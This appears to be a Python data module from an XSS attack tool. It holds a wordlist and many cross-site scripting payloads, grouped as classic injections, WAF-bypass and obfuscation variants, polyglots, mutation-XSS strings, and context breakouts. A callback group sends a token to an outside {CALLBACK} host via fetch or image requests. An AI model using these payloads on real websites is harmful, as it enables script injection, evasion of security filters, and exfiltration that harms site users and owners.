WORDLIST = ["admin", "login", "backup", "uploads", "config", "api", "git"]

PAYLOADS_DB = {
    "classic": [
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<svg onload=confirm(1)>",
        "<img src=x onerror=confirm(1)>",
        "<svg/onload=prompt(1)>",
    ],
    "waf_bypass": [
        # template / backtick
        "<svg/onload=alert`1`>",
        "<img src=x onerror=alert`1`>",
        "<details/open/ontoggle=alert`1`>",
        # concat
        "<img src=x onerror=window['ale'+'rt'](1)>",
        "<svg/onload=window['ale'+'rt'](1)>",
        "<img src=x onerror=self['ale'+'rt'](1)>",
        "<svg/onload=top['ale'+'rt'](1)>",
        # unicode / hex
        "<details open ontoggle=self['\\u0061\\u006c\\u0065\\u0072\\u0074'](1)>",
        "<img src=x onerror=window['\\x61\\x6c\\x65\\x72\\x74'](1)>",
        "<svg/onload=eval('\\u0061\\u006c\\u0065\\u0072\\u0074(1)')>",
        # atob
        "<svg/onload=eval(atob`YWxlcnQoMSk=`)>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<details open ontoggle=eval(atob('YWxlcnQoMSk='))>",
        # fromCharCode
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        # location split
        "<svg/onload=location='javas'+'cript:ale'+'rt(1)'>",
        "<img src=x onerror=location=`javascript:alert(1)`>",
        # SVG events
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set onbegin=alert(1) attributeName=x to=1>",
        "<svg><animateMotion onbegin=alert(1) dur=1s>",
        # new events
        "<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>",
        "<input type=hidden id=x onbeforematch=alert(1) hidden=until-found>",
        # case / junk
        "<ScRiPt>alert(1)</sCrIpT>",
        "<svg/oNlOaD=alert(1)>",
        "<img src=x oNeRrOr=alert(1)>",
        "<svg/**/onload=alert(1)>",
        "<img src=x onerror=/**/alert(1)>",
        # polyglots
        '"><svg/onload=alert`1`><"',
        "'\"><img/src/onerror=.1|alert`1`>",
        # mXSS
        "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;\">",
        "<noscript><style></noscript><img src=x onerror=alert(1)>",
        "<form><math><mtext></form><form><mglyph><svg><mpath><set attributeName=onmouseover to=alert(1)>",
    ],
    "callback": [
        '<img src=x onerror="fetch(\'{CALLBACK}/x/{TOKEN}\')">',
        "<svg/onload=\"new Image().src='{CALLBACK}/x/{TOKEN}'\">",
        "<script>fetch('{CALLBACK}/x/{TOKEN}')</script>",
        "<details open ontoggle=\"new Image().src='{CALLBACK}/x/{TOKEN}'\">",
        "<body onload=\"new Image().src='{CALLBACK}/x/{TOKEN}'\">",
        "<iframe src=\"javascript:fetch('{CALLBACK}/x/{TOKEN}')\">",
        "<img src=x onerror=\"location='{CALLBACK}/x/{TOKEN}'\">",
        "<svg/onload=\"fetch('{CALLBACK}/x/{TOKEN}')\">",
        "<img src=x onerror=\"new Image().src='{CALLBACK}/x/{TOKEN}'\">",
        "<svg/onload=\"window.location='{CALLBACK}/x/{TOKEN}'\">",
    ],
}

CONTEXT_PAYLOADS = {
    "attribute": [
        '"><svg/onload=alert(1)>',
        "'><svg/onload=alert(1)>",
        '" autofocus onfocus=alert(1) x="',
        "' autofocus onfocus=alert(1) x='",
        '" onmouseover=alert(1) x="',
        '"><details open ontoggle=alert(1)>',
        '"><img src=x onerror="fetch(\'{CALLBACK}/x/{TOKEN}\')">',
        '"><svg/onload=alert`1`>',
        '" onfocus=alert`1` autofocus x="',
        '"><img src=x onerror=window[\'ale\'+\'rt\'](1)>',
    ],
    "html": [
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<script>alert(1)</script>",
        "<svg/onload=alert`1`>",
        "<img src=x onerror=window['ale'+'rt'](1)>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>",
        "<ScRiPt>alert(1)</sCrIpT>",
    ],
    "js": [
        "';alert(1);//",
        '";alert(1);//',
        "`;alert(1);//",
        "${alert(1)}",
        "</script><svg/onload=alert(1)>",
        "</script><img src=x onerror=alert(1)>",
        "';alert`1`//",
        "';window['ale'+'rt'](1)//",
        "';eval(atob('YWxlcnQoMSk='))//",
        "';eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",
    ],
}

